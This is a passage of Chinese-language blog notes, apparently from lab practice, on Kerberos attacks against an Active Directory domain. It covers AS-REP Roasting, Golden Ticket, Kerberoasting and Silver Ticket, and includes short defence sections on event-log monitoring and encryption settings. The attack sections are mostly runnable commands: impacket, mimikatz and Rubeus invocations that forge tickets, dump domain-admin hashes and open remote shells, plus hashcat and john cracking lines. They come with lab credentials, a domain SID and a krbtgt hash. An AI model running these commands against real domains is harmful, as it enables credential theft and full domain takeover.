<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">首先利用Adfind，过滤出	“不需要Kerberos预身份认证”的账户<br><br>然后用impacket包里面的工具GetNPUsers.py进行获取<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>



<p>操作</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">adfind -h <span class="hljs-number">192.168.8.1</span>:<span class="hljs-number">389</span> -u sayms\aim -up admin@<span class="hljs-number">123</span> -f &quot;useraccountcontrol:<span class="hljs-number">1.2.840</span>.<span class="hljs-number">113556.1.4</span>.<span class="hljs-number">803</span>:=<span class="hljs-number">4194304</span>&quot; -dn<br></code></pre></td></tr></table></figure>



<p>然后将获取到的用户，写入user.txt文件</p>
<p>执行</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">python3 GetNPUsers.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> -usersfile <span class="hljs-keyword">user</span>.txt -<span class="hljs-keyword">format</span> john sayms.<span class="hljs-keyword">local</span>/<br></code></pre></td></tr></table></figure>

<p>但是失败了</p>
<p>可能是88端口，不对外开放</p>
<p>也可以直接使用impacket包里面的工具GetNPUsers.py进行爆破，前提是你的用户名字典足够厉害</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">python3 GetNPUsers.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> -userfile users.txt -<span class="hljs-keyword">format</span> john sayms.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>







<h3 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h3><h4 id="john"><a href="#john" class="headerlink" title="john"></a>john</h4><p>对字典要求比价大，字典内容为明文密码，不需要为hash</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">john --wordlist=<span class="hljs-regexp">/opt/</span>psaawords.txt <span class="hljs-built_in">hash</span>.txt<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213213852501.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213213852501</span></p>
<p>成功</p>
<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>因为上面的测试，保存的hash值都是john模式</p>
<p>此时hashcat是无法破译的</p>
<p>需要加上$23</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213214201116.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213214201116</span></p>
<p>然后进行破译</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">18200</span> hash<span class="hljs-selector-class">.txt</span> passwords<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213214542657.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213214542657</span></p>
<h3 id="AS-REP-Roasting防御"><a href="#AS-REP-Roasting防御" class="headerlink" title="AS_REP Roasting防御"></a>AS_REP Roasting防御</h3><p>1.取消    “不需要Kerberos预身份认证”</p>
<p>2.日志层面，关注事件ID为4768，预身份认证为0的日志</p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>获得域内账户krbtgt的密钥值</p>
<p>想要拿到krbtgt账户的密钥值，一般想要高权限用户，所以黄金票据攻击一般用于权限维持</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>发生在AS_REP阶段，在进过预认证之后，KDC返回的TGT的authorization-data是krbtgt的密钥加密的</p>
<p>authorization-data中存放的PAC里面的重要部分也是krbtgt密钥加密的</p>
<p>PAC主要是存放用户的身份信息，PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM是PAC的重要部分</p>
<p>所以我们<font color='red'>拿到krbtgt的密钥之后，就可以伪造高权限PAC，放到TGT中，然后用这个高权限，来请求服务票据</font></p>
<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>伪造TGT是不需要连接KDC的，整个过程是离线的</p>
<p>创建黄金票据需要的信息</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">krbtgt的密钥值<br>域名<br>域SID<br>伪造的高权限域用户的用户名<br></code></pre></td></tr></table></figure>

<p>一般需要在域控上面查询</p>
<p>黄金票据攻击一般工具Impacket、mimikatz、CS</p>
<h3 id="利用Impacket攻击"><a href="#利用Impacket攻击" class="headerlink" title="利用Impacket攻击"></a>利用Impacket攻击</h3><p>思路</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">生成票据（ticketer.<span class="hljs-keyword">py</span>）<br><br>导入票据<br><br>导出hash（secretsdump.<span class="hljs-keyword">py</span>)<br><br>连接（smbexec.<span class="hljs-keyword">py</span>）<br></code></pre></td></tr></table></figure>



<p>生成黄金票据</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">python3 ticketer.py -<span class="hljs-built_in">domain</span>-sid sid值 -nthash 哈希值 -<span class="hljs-built_in">domain</span> 域名 域管账户名字<br></code></pre></td></tr></table></figure>







<p>导入票据</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=域管账户名.ccache<br></code></pre></td></tr></table></figure>



<p>导出域管账户的hash</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass 域管账户@域控主机名.域名 -dc-ip 域控ip -just-dc-user 域管账户名<br></code></pre></td></tr></table></figure>



<p>远程连接</p>
<p>需要注意的是</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">需要先在本地的hosts文件中添加要远程访问主机的<span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure>

<p>远程连接域控</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> smbexec.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">no</span>-pass -<span class="hljs-keyword">k</span> 域管账户@域控主机名.域名 -dc-ip 域控ip<br></code></pre></td></tr></table></figure>



<p>远程连接其他主机</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> smbexec.py -<span class="hljs-literal">no</span>-pass -k 域管账户@其他主机名.域名 -dc-ip 域控ip -codec gbk      <span class="hljs-comment">#没有写错，就是域控的ip</span><br></code></pre></td></tr></table></figure>







<h3 id="利用mimikatz攻击"><a href="#利用mimikatz攻击" class="headerlink" title="利用mimikatz攻击"></a>利用mimikatz攻击</h3><p>mimikatz攻击可以使用域内机器，也可以是非域内机器</p>
<p>不在域内的机器，需要把其的DNS服务器设置为域控</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">set</span> <span class="hljs-symbol">dns</span> &quot;以太网&quot; <span class="hljs-symbol">static</span> 域控<span class="hljs-symbol">ip</span><br></code></pre></td></tr></table></figure>



<p>操作</p>
<p>首先尝试远程访问C盘</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217233131593.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230217233131593</span></p>
<p>权限不够，拒绝访问</p>
<p>生成黄金票据，导入内存，就有高权限，来导出任意用户的hash</p>
<p><strong>注意：在生成黄金票据之前一定要先删除之前的所有票据，如果存在多个票据，系统不知道选用哪一个，会随机选取</strong></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#删除所有票据</span><br><span class="hljs-attribute">klist</span> purge<br><br><span class="hljs-comment">#查看存在哪些票据</span><br>klist<br></code></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#导入golden</span><br><span class="hljs-attribute">kerberos</span>::golden /user:administrator /domain:sayms.local /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">199966615</span>-<span class="hljs-number">2708578713</span>-<span class="hljs-number">1277870648</span> /krbtgt:<span class="hljs-number">020</span>da1822e87dc4b9d87cf7891f3c7e8 /ptt<br></code></pre></td></tr></table></figure>

<p>导入成功</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230216122002809.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230216122002809</span></p>
<p>远程访问C盘</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217233212497.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230217233212497</span></p>
<p>成功</p>
<h3 id="利用CS攻击"><a href="#利用CS攻击" class="headerlink" title="利用CS攻击"></a>利用CS攻击</h3><p>CS工具就比较好用，窗口化，自动化</p>
<p>拿到session之后，就可以进行操作</p>
<p>选择黄金票据，然后填入需要的参数即可</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">用户名<br><br>域名<br><br>域SID<br><br>krbtgt的<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>

<p>然后就是一键完成攻击</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>黄金票据利用的是kerberos协议的缺陷，而不是漏洞，需要高权限的基础，才能完成黄金票据攻击</p>
<p>黄金票据主要是利用了AS和TGS之间的信任基础</p>
<h1 id="TGS阶段攻击"><a href="#TGS阶段攻击" class="headerlink" title="TGS阶段攻击"></a>TGS阶段攻击</h1><h2 id="kerberosasting攻击"><a href="#kerberosasting攻击" class="headerlink" title="kerberosasting攻击"></a>kerberosasting攻击</h2><p>主要用于域内权限提升</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>在第四阶段，即TGS_REP</p>
<p>TGS服务端，返回客户端一个由服务的hash加密的ST</p>
<p>然后客户就可以拿到进行本地爆破</p>
<p><font color='red'>爆破得到一个有权限访问对应SPN的账户密码</font></p>
<p>核心在于ST的加密是客户端和KDC进行协商的，客户端可以选择容易破解的<font color='red'>RC4_HMAC_MD5</font>算法进行加密</p>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p>首先随意输入一个域内正确的账户密码，来获取一个TGT</p>
<p>用获得的TGT，去请求指定SPN的ST，这个过程中用户和KDC可以协商加密算法，选择RC4_HMAC_MD5</p>
<p>（SPN是域内注册的服务器主体名称）</p>
<p>只有是有效的TGT，无论提供的域内账户密码是否有权限访问SPN服务，都会返回一个用能够请求该服务账号的hash并且以RC4_HMAC_MD5</p>
<p>算法加密的ST</p>
<p>（用于加密的是服务账户的hash，服务账户的密码一般是安装时，服务自己设置的，并且基本不会改动，易破解）</p>
<p>最后从TGS_REP数据包中提取ST，进行本地爆破，拿到能够访问该服务的明文密码</p>
<p>（我们拿到的是服务密码）</p>
<p>简而言之大概步骤就是</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">查询域内注册于域用户下的SPN<br><br>请求指定SPN的<span class="hljs-keyword">ST</span><br><br>导出<span class="hljs-keyword">ST</span><br><br>破解<br></code></pre></td></tr></table></figure>





<h4 id="SPN的发现"><a href="#SPN的发现" class="headerlink" title="SPN的发现"></a>SPN的发现</h4><p>找到域内所有注册在域用户下的SPN</p>
<p>三个常用工具<font color='red'>RiskySPN</font>、<font color='red'>GetUserSPNs</font>和<font color='red'>PowerView.ps1</font></p>
<p><strong>RiskySPN</strong></p>
<p>属于powershell脚本</p>
<p>会自动检测识别若密码的服务票据</p>
<p>根据用户账户和密码过期时间来判别最容易包含弱密码的票据</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">exec</span> <span class="hljs-variable">bypass</span><br><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><span class="hljs-operator">;</span><br><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span> <span class="hljs-operator">-</span><span class="hljs-variable">FullData</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217173901689.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230217173901689</span></p>
<p>没有回显，有点尴尬，可能是因为没有用户注册吧</p>
<p><strong>GetUserSPNs</strong></p>
<p>会查询所有注册在域用户下的SPN</p>
<p>有两种VBS和powershell</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#VBS</span><br>cscript .<span class="hljs-string">\GetUserSPNs.vbs</span><br><br><span class="hljs-comment">#PowerShell</span><br>Import-Module .<span class="hljs-string">\GetUserSPNs.ps1</span><br></code></pre></td></tr></table></figure>



<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217175705352.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230217175705352</span></p>
<p>找到一个krbtgt的kadmin/changepw</p>
<p>这个是没有用的，它是随机生成的，几乎不可能爆破</p>
<p><strong>PowerView.ps1</strong></p>
<p>powersploit中recon目录下的脚本</p>
<p>用法</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">PowerView</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">NetUser</span> <span class="hljs-operator">-</span><span class="hljs-variable">SPN</span><br></code></pre></td></tr></table></figure>





<h4 id="请求服务票据"><a href="#请求服务票据" class="headerlink" title="请求服务票据"></a>请求服务票据</h4><p>主要有三种</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">impacket的<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GetUserSPNs</span>.</span></span>py<br><br>Rubeus<br><br>mimikatz<br><br>其中impacket和rubeus请求之后，会直接导出<br></code></pre></td></tr></table></figure>





<p><strong>impacket</strong></p>
<p>该工具包下的GetUserSPNs.py可以请求注册在用户下的所有SPN服务票据，也可以请求注册于指定用户下的SPN服务票据</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment">#请求注册于用户下的所有SPN服务票据，以hashcat可以破解的格式保存</span><br>python3 GetUserSPNs.py -request -dc-ip 域控ip sayms.local/tony:admin123$% -outputfile hash.txt<br><br><span class="hljs-comment">#请求指定注册于tony用户下的SPN票据，以hashcat可以破解的格式保存</span><br>python3 GetUserSPNs.py -request -dc-ip 域控ip sayms.local/tony:admin123$% -outputfile hash.txt -request-<span class="hljs-keyword">user</span> <span class="hljs-title">tony</span><br></code></pre></td></tr></table></figure>





<p><strong>Rubeus</strong></p>
<p>该工具比较厉害</p>
<p>它会先用LDAP查询域内所有注册在域用户下的SPN</p>
<p>然后发送TGS包，最后直接输出能破解出的hash格式，例如John、hashcat</p>
<p>用法</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#导出所有的</span><br>Rubeus.exe kerberoast <span class="hljs-regexp">/format:john /</span>outfile:hash.txt<br><br><span class="hljs-comment">#导出指定SPN的服务票据</span><br>Rubeus.exe kerberoast <span class="hljs-regexp">/spn:SQLServer/</span>win7.sayms.local:<span class="hljs-number">1433</span><span class="hljs-regexp">/MSSQL /</span>format:john /outfile:hash.txt<br></code></pre></td></tr></table></figure>







<p><strong>mimikatz</strong></p>
<p>mimikatz不会导出票据，只会把请求完成之后的票据保存在内存中</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kerberos::ask<span class="hljs-regexp">/target:SQLServer/</span>win7.sayms.local:<span class="hljs-number">1433</span>/MSSQL<br></code></pre></td></tr></table></figure>







<h4 id="导出服务票据"><a href="#导出服务票据" class="headerlink" title="导出服务票据"></a>导出服务票据</h4><p>首先是查看内存中保存了哪些票据</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#cmd</span><br>klist<br><br><span class="hljs-meta">#mimikatz</span><br>kerberos::list<br></code></pre></td></tr></table></figure>



<p><strong>mimikatz导出</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>

<p>会导出kirbi格式的票据文件</p>
<p><strong>empire导出</strong></p>
<p>empire下的Invoke-Kerberoast.ps1脚本，可以导出John格式和hashcat格式的票据文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1;<br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-outputFormat</span> hashcat<br></code></pre></td></tr></table></figure>







<h4 id="破解票据"><a href="#破解票据" class="headerlink" title="破解票据"></a>破解票据</h4><p>其实就是破解hash</p>
<p>上面我们导出的文件有John格式、hashcat格式、kirbi格式</p>
<p>其中John和hashcat格式好说</p>
<p><strong>kirbi格式破解</strong></p>
<p>两种方法kerberoast、tgscrack</p>
<p>kerberoast里面的tgsrepcrack.py可以破解kirbi格式</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 tgsrepcrack<span class="hljs-selector-class">.py</span> pass<span class="hljs-selector-class">.txt</span> tony@SQLServer~win7<span class="hljs-selector-class">.sayms</span>.local~<span class="hljs-number">1433</span>~MSSQL-SAYMS<span class="hljs-selector-class">.LOCAL</span>.kirbi<br></code></pre></td></tr></table></figure>



<p>tgscrack</p>
<p>先把kirbi格式的文件转化为它能够破解的格式，然后再破解</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 extractServiceTicketParts<span class="hljs-selector-class">.py</span> tony@SQLServer~win7<span class="hljs-selector-class">.sayms</span>.local~<span class="hljs-number">1433</span>~MSSQL-SAYMS<span class="hljs-selector-class">.LOCAL</span><span class="hljs-selector-class">.kirbi</span> &gt; hash<span class="hljs-selector-class">.txt</span><br><br>go run tgscrack<span class="hljs-selector-class">.go</span> -hashfile hash<span class="hljs-selector-class">.txt</span> -wordlist pass.txt<br></code></pre></td></tr></table></figure>



<p><strong>hashcat格式破解</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> pass<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span><br></code></pre></td></tr></table></figure>





<h3 id="Kerberoasting防御"><a href="#Kerberoasting防御" class="headerlink" title="Kerberoasting防御"></a>Kerberoasting防御</h3><ol>
<li>首先能够执行该攻击最直接的原因是因为RC4_HMAC_MD5算法容易破解，强制改为AES256_HMAC算法，但是该算法会存在兼容性问题</li>
</ol>
<ol start="2">
<li>为服务账户设置强密码，或者定期修改密码</li>
</ol>
<ol start="3">
<li>好多服务都分配了过高的权限，导致攻击成功之后就能够权限提升，所有依照权限最小化原则设置权限</li>
</ol>
<ol start="4">
<li>日志审计，关注ID为4769的日志，如果突然有过多4769的日志，且加密类型为0x17，可能就是受到了攻击</li>
</ol>
<ol start="5">
<li>使用工具检测，zBang</li>
</ol>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>白银票据攻击发生在TGS_REP阶段</p>
<p>TGS认证客户端发来的TGT，成功之后，将会返回指定服务的ST</p>
<p>ST中加密部分authorization-data，是用服务的密钥加密的</p>
<p>authorization-data中的PAC，PAC包含PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM</p>
<p>其中PAC_SERVER_CHECKSUM是用服务的hash加密的，PAC_PRIVSVR_CHECKSUM是用krbtgt的hash加密的</p>
<p>但是</p>
<p>PAC_PRIVSVR_CHECKSUM签名的认证是可选的，且默认不开启，所以即使无法伪造PAC_PRIVSVR_CHECKSUM签名，也可完成攻击</p>
<p>所以只要能够<font color='red'>拿到指定服务的密钥，就可以伪造PAC，放入ST，从而以高权限访问服务</font></p>
<p>因为服务验证了TGS票据之后，一般不会返回域控去验证TGS的合法性</p>
<p>部分服务对应的关系</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">应用服务类型												需要的服务<br><span class="hljs-variable">WMI</span>														<span class="hljs-variable">HOST</span>、<span class="hljs-variable">RPCSS</span><br><br><span class="hljs-variable">PowerShell</span> <span class="hljs-variable">Remoting</span>										<span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><br><span class="hljs-variable">WinRM</span>													<span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><br><span class="hljs-variable">Scheduled</span> <span class="hljs-built_in">Tasks</span>											<span class="hljs-variable">HOST</span><br><br><span class="hljs-variable">Windows</span> <span class="hljs-built_in">File</span> <span class="hljs-built_in">Share</span>										<span class="hljs-variable">CIFS</span><br><br><span class="hljs-variable">LDAP</span> <span class="hljs-variable">operations</span>											<span class="hljs-variable">LDAP</span><br><br><span class="hljs-variable">Windows</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Server</span> <span class="hljs-variable">Administrations</span> <span class="hljs-variable">Tools</span>				<span class="hljs-variable">RPCSS</span>、<span class="hljs-variable">LDAP</span>、<span class="hljs-variable">CIFS</span><br></code></pre></td></tr></table></figure>





<h3 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">服务的密钥（一般就是主机的<span class="hljs-built_in">hash</span>值）<br><br>域SID<br><br>域名<br><br>伪造的域用户，要是高权限用户<br></code></pre></td></tr></table></figure>





<h3 id="利用impacket攻击"><a href="#利用impacket攻击" class="headerlink" title="利用impacket攻击"></a>利用impacket攻击</h3><p>使用ticketer.py生成白银票据</p>
<p>然后导入票据</p>
<p>然后使用smbexec.py、secretsdump.py来进行利用</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">#生成白银票据<br><span class="hljs-keyword">python3</span> ticketer.<span class="hljs-keyword">py</span> -domain-sid sid值 -nthash 哈希值 -spn 服务名/域控主机名.域名 -domain 域名 域管账户名字<br><span class="hljs-keyword">python3</span> ticketer.<span class="hljs-keyword">py</span> -domain-sid sid值 -nthash 哈希值 -spn cifs/DC.sayms.local -domain sayms.local administrator<br><br>#导入票据<br>export KRB5CCNAME=域管账户名.ccache<br><br>#远程连接域控<br><span class="hljs-keyword">python3</span> smbexec.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">no</span>-pass -<span class="hljs-keyword">k</span> 域管账户@域控主机名.域名 -dc-ip 域控ip<br><br>#导出管理员的hash<br><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass 域管账户@域控主机名.域名 -dc-ip 域控ip -just-dc-user 域管账户名<br></code></pre></td></tr></table></figure>

<p>S-1-5-21-199966615-2708578713-1277870648-500</p>
<p>80a28b3ca1457d5d09adf2e153d98b1d</p>
<h3 id="利用mimikatz攻击-1"><a href="#利用mimikatz攻击-1" class="headerlink" title="利用mimikatz攻击"></a>利用mimikatz攻击</h3><p>mimikatz进行攻击，使用的机器可以是域内的，也可以是非域内主机</p>
<p>非域内主机，需要将DNS服务设置为域控</p>
